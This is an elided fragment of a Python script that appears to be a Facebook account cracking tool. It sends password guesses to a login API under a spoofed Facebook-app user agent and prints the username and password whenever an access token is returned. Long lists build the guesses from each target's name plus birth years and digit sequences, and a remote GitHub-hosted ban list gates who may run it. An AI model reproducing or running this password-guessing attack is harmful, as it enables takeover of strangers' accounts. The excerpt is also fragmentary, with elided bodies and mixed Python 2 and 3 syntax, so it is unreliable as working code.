...
def xoshnaw():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/ImxProfis0r/Hama.py/main/Fuck.txt").text
    if id in httpCaht:
      ...
      print("\x1b[1;91mIDET ACTIVE NIA LA TELEGRAM NAMA BNERA BO @ImProfis0r...!")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def mking():
    ...
    try:
        ...
        print '%s\x1b[0;92m*%s HELLO %s%s%s' % (O, N, K, nama, N)
        time.sleep(2)
        print '\x1b[1;97m-------------------------------------------------'
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
                ...
                _sultani = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    print '\r%s[ OK ] %s : %s | %s %s %s%s' % (K, user, pw, day, month, year, N)
                ...
                for yntkts in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '1980', xz[0] + '1981', xz[0] + '1982', xz[0] + '1983', xz[0] + '1984', xz[0] + '1985', xz[0] + '1986', xz[0] + '1987', xz[0] + '1988', xz[0] + '1989', xz[0] + '1990', xz[0] + '1991', xz[0] + '1992', xz[0] + '1993', xz[0] + '1994', xz[0] + '1995', xz[0] + '1996', xz[0] + '1997', xz[0] + '1998', xz[0] + '1999', xz[0] + '2000', xz[0] + '2001', xz[0] + '2002', xz[0] + '2003', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2007', xz[0] + '2008', xz[0] + '2009', xz[0] + '12', xz[0] + '123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', xz[0] + '1122', xz[0] + '112233', xz[0] + '11223344', xz[0] + '1122334455', xz[0] + '123321', xz[0] + '12344321', xz[0] + '123123', xz[0] + '12341234', xz[0] + '1234512345', xz[0] + '121212', xz[0] + '123456', xz[0] + '12345678', xz[0] + '54321', xz[0] + '321', xz[0] + '4321']
                        else:
                            pwx = [name, xz[0] + '1980', xz[0] + '1981', xz[0] + '1982', xz[0] + '1983', xz[0] + '1984', xz[0] + '1985', xz[0] + '1986', xz[0] + '1987', xz[0] + '1988', xz[0] + '1989', xz[0] + '1990', xz[0] + '1991', xz[0] + '1992', xz[0] + '1993', xz[0] + '1994', xz[0] + '1995', xz[0] + '1996', xz[0] + '1997', xz[0] + '1998', xz[0] + '1999', xz[0] + '2000', xz[0] + '2001', xz[0] + '2002', xz[0] + '2003', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2007', xz[0] + '2008', xz[0] + '2009', xz[0] + '12', xz[0] + '123', xz[0] + '1234', xz[0] + '12345', xz[0] + '123456', xz[0] + '1122', xz[0] + '112233', xz[0] + '11223344', xz[0] + '1122334455', xz[0] + '123321', xz[0] + '12344321', xz[0] + '123123', xz[0] + '12341234', xz[0] + '1234512345', xz[0] + '121212', xz[0] + '123456', xz[0] + '12345678', xz[0] + '54321', xz[0] + '321', xz[0] + '4321']
